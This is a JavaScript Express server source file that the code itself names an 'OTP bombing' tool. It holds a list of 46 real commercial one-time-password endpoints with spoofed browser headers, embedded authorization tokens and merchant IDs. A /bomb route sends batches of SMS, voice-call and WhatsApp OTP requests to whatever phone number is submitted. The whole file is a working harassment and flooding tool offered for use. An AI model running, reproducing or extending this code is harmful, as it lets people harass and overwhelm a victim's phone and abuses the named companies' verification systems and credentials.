// ============================================================
// api_server.js - OTP Bombing API Server (46 APIs)
// 16 Working + 30 New APIs | 10min Cap | Logs | Delay
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🔥 CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;

// ============================================================
// ===== ALL APIS (16 Working + 30 New) =====
// ============================================================

const APIS = [
    // ============================================================
    // 🟢 TIER 1 — RELIABLE (6 APIs)
    // ============================================================
    {
        name: "GetInstaCash",
        method: "POST",
        url: "https://getinstacash.in/sell/getData.php",
        headers: {
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://getinstacash.in",
            "Referer": "https://getinstacash.in/sell/login"
        },
        data: { "_raw": "type=sendOTP&mobile={phone}" }
    },
    {
        name: "Flipkart_2",
        method: "GET",
        url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default"
        }
    },
    {
        name: "AakashDigital_2",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/user/register"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "RedBus_1",
        method: "GET",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.redbus.in/preregister"
        }
    },
    {
        name: "Snapdeal",
        method: "POST",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        headers: {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083",
            "accept": "*/*",
            "origin": "https://m.snapdeal.com",
            "referer": "https://m.snapdeal.com/signin"
        },
        data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" }
    },
    {
        name: "Quikr",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.quikr.com",
            "referer": "https://www.quikr.com/"
        },
        data: { "_raw": "user={phone}&v3=true" }
    },

    // ============================================================
    // 🟡 TIER 2 — PURANI WORKING (5 APIs)
    // ============================================================
    {
        name: "Tata Capital Voice",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Ogonn",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "origin": "https://ogonn.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://ogonn.in/login"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "AakashDigital_1",
        method: "POST",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        headers: {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/"
        },
        data: { "_raw": "&mobileval={phone}&otp=6230" }
    },
    {
        name: "Flipkart_1",
        method: "POST",
        url: "https://1.rome.api.flipkart.com/1/action/view",
        headers: {
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "Origin": "https://www.flipkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login"
        },
        data: {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY",
                "loginIdPrefix": "+91",
                "loginId": "{phone}",
                "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" },
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "screenName": "LOGIN_V4_MOBILE",
                "sourceContext": "DEFAULT"
            }
        }
    },
    {
        name: "Netmeds",
        method: "GET",
        url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.netmeds.com/customer/account/login"
        }
    },

    // ============================================================
    // 🟢 TIER 3 — NAYI WORKING (5 APIs)
    // ============================================================
    {
        name: "Vedantu",
        method: "POST",
        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/"
        },
        data: { "email": null, "phoneCode": "+91", "phoneNumber": "{phone}", "ver": "11.345" }
    },
    {
        name: "KPN WhatsApp",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
        data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "Oyo_1",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "text/plain;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login"
        },
        data: { "phone": "{phone}", "country_code": "+91", "nod": 4 }
    },
    {
        name: "Ullu",
        method: "POST",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "origin": "https://ullu.app",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "referer": "https://ullu.app/"
        },
        data: {}
    },
    {
        name: "Hungama OTP",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" })
    },

    // ============================================================
    // 🆕 30 NAYI APIs
    // ============================================================
    {
        name: "Delhivery",
        method: "GET",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "ConfirmTkt",
        method: "GET",
        url: "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={phone}",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "PharmEasy_NEW",
        method: "POST",
        url: "https://pharmeasy.in/api/auth/requestOTP",
        headers: {
            "Host": "pharmeasy.in",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
            "Accept": "*/*",
            "Content-Type": "application/json"
        },
        data: { "contactNumber": "{phone}" }
    },
    {
        name: "HeroMotoCorp",
        method: "POST",
        url: "https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php",
        headers: {
            "Host": "www.heromotocorp.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        data: { "_raw": "mobile_no={phone}&randome=ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=" }
    },
    {
        name: "IndiaLends",
        method: "POST",
        url: "https://indialends.com/internal/a/mobile-verification_v2.ashx",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        data: { "_raw": "aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={phone}&lj80gertdfg=0" }
    },
    {
        name: "Flipkart_Signup",
        method: "POST",
        url: "https://www.flipkart.com/api/6/user/signup/status",
        headers: {
            "Content-Type": "application/json; charset=utf-8"
        },
        data: (phone) => JSON.stringify({ loginId: [`+91${phone}`], supportAllStates: true })
    },
    {
        name: "Flipkart_OTP",
        method: "POST",
        url: "https://www.flipkart.com/api/5/user/otp/generate",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "loginId=%2B91{phone}&state=VERIFIED&churnEmailRequest=false" }
    },
    {
        name: "Lenskart_refr",
        method: "POST",
        url: "https://www.ref-r.com/clients/lenskart/smsApi",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "mobile={phone}&submit=1" }
    },
    {
        name: "Practo",
        method: "POST",
        url: "https://accounts.practo.com/send_otp",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "client_name=Practo+Android+App&mobile=%2B91{phone}" }
    },
    {
        name: "PizzaHut_NEW",
        method: "POST",
        url: "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en",
        headers: {
            "Content-Type": "application/json"
        },
        data: (phone) => JSON.stringify({ customer: { MobileNo: phone, UserName: phone, merchantId: "98d18d82-ba59-4957-9c92-3f89207a34f6" } })
    },
    {
        name: "Goibibo",
        method: "POST",
        url: "https://www.goibibo.com/common/downloadsms/",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "mbl={phone}" }
    },
    {
        name: "ApolloPharmacy",
        method: "POST",
        url: "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Ajio_NEW",
        method: "POST",
        url: "https://www.ajio.com/api/auth/signupSendOTP",
        headers: {
            "Content-Type": "application/json"
        },
        data: (phone) => JSON.stringify({ firstName: "User", login: "user@gmail.com", password: "Pass@123", mobileNumber: phone, requestType: "SENDOTP" })
    },
    {
        name: "AltBalaji_NEW",
        method: "POST",
        url: "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
        headers: {
            "Content-Type": "application/json;charset=UTF-8"
        },
        data: (phone) => JSON.stringify({ country_code: "91", phone_number: phone })
    },
    {
        name: "Aala",
        method: "POST",
        url: "https://www.aala.com/accustomer/ajax/getOTP",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "email=91{phone}&firstname=User&lastname=User" }
    },
    {
        name: "Grab",
        method: "POST",
        url: "https://api.grab.com/grabid/v1/phone/otp",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "method=SMS&countryCode=id&phoneNumber=91{phone}&templateID=pax_android_production" }
    },
    {
        name: "Gokwik_1",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
            "Content-Type": "application/json",
            "gk-merchant-id": "19g6im8srkz9y"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Gokwik_2",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
            "Content-Type": "application/json",
            "gk-merchant-id": "19an4fq2kk5y"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Breeze",
        method: "POST",
        url: "https://api.breeze.in/session/start",
        headers: {
            "Content-Type": "application/json"
        },
        data: (phone) => JSON.stringify({ phoneNumber: phone, authVerificationType: "otp", countryCode: "+91" })
    },
    {
        name: "Gokwik_3",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA",
            "Content-Type": "application/json",
            "gk-merchant-id": "19g6ilhej3mfc"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Kisan",
        method: "POST",
        url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        headers: {
            "Content-Type": "application/json"
        },
        data: (phone) => JSON.stringify({ mobile_number: phone, client_id: "kisan-app" })
    },
    {
        name: "PenPencil",
        method: "POST",
        url: "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        headers: {
            "Content-Type": "application/json"
        },
        data: (phone) => JSON.stringify({ mobile: phone, organizationId: "5eb393ee95fab7468a79d189" })
    },
    {
        name: "Khatabook",
        method: "POST",
        url: "https://api.khatabook.com/v1/auth/request-otp",
        headers: {
            "Content-Type": "application/json"
        },
        data: (phone) => JSON.stringify({ country_code: "+91", phone: phone, app_signature: "Jc/Zu7qNqQ2" })
    },
    {
        name: "Jockey",
        method: "GET",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "Gokwik_4",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
            "Content-Type": "application/json",
            "gk-merchant-id": "19kc37zcdyiu"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Vidyakul",
        method: "POST",
        url: "https://vidyakul.com/signup-otp/send",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "phone={phone}&rcsconsent=true" }
    },
    {
        name: "AdityaBirla",
        method: "POST",
        url: "https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp",
        headers: {
            "Content-Type": "application/json"
        },
        data: (phone) => JSON.stringify({ request: "CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw==" })
    },
    {
        name: "Pinknblu",
        method: "POST",
        url: "https://pinknblu.com/v1/auth/generate/otp",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "_token=fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb&country_code=%2B91&phone={phone}" }
    },
    {
        name: "Udaan",
        method: "POST",
        url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "mobile={phone}" }
    },
    {
        name: "Nuvama",
        method: "POST",
        url: "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO",
        headers: {
            "Content-Type": "application/json"
        },
        data: (phone) => JSON.stringify({ contactInfo: phone, mode: "SMS" })
    }
];

console.log(`✅ Loaded ${APIS.length} total APIs`);
console.log(`⏱️  Max duration cap: ${MAX_DURATION_MIN} minutes`);
console.log(`⏳ API delay: ${API_DELAY_MS}ms | Batch delay: ${BATCH_DELAY_MS}ms`);

// ============================================================
// ===== API CALL FUNCTION =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        return JSON.stringify({ mobile: phone });
    }
    if (lower.includes('whatsapp')) {
        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    }
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) {
                            newObj[key] = replacePhone(obj[key]);
                        }
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: 5000,
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        return { status: response.status, success: true, responseTime };
    } catch (err) {
        if (retryCount < 1 && 
            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        return { status: null, success: false, responseTime: Date.now() - startTime };
    }
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        apis: APIS.length,
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        uptime: process.uptime()
    });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    
    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);

    try {
        const startTime = Date.now();
        let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
        const apiList = APIS;
        const BATCH_SIZE = 5;
        
        let maxRequests = 100;
        if (effectiveDuration <= 1) maxRequests = 200;
        else if (effectiveDuration <= 5) maxRequests = 150;
        else if (effectiveDuration <= 10) maxRequests = 100;
        else maxRequests = 80;

        const shuffled = [...apiList];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        let sent = 0;
        for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
            const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
            
            const results = await Promise.allSettled(
                batch.map(api => makeApiCall(api, phone))
            );
            
            for (let k = 0; k < results.length; k++) {
                const result = results[k];
                const api = batch[k];
                
                if (result.status === 'fulfilled' && result.value && result.value.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp');
                    const type = isCall ? 'CALL' : (isWhatsapp ? 'WA' : 'SMS');
                    
                    console.log(`  ✅ [${success}] ${apiName} → ${result.value.status} (${result.value.responseTime}ms) [${type}]`);
                    
                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else {
                    const apiName = api.name || '';
                    const status = result.value?.status || 'FAIL';
                    const responseTime = result.value?.responseTime || 0;
                    console.log(`  ❌ ${apiName} → ${status} (${responseTime}ms)`);
                }
            }
            
            if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
                await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
            }
        }

        const elapsed = (Date.now() - startTime) / 1000;
        
        console.log(`✅ Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s\n`);
        
        res.json({
            success: true,
            phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: success,
            sms: smsCount,
            calls: callCount,
            whatsapp: whatsappCount,
            elapsed: elapsed.toFixed(1) + 's',
            total_apis: APIS.length
        });
        
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        apis: APIS.map(a => a.name),
        instances: process.env.INSTANCE_NAME || 'api'
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 API Server running on port ${PORT}`);
    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    console.log(`📊 APIs loaded: ${APIS.length} (16 working + 30 new)`);
    console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
    console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
    console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
});
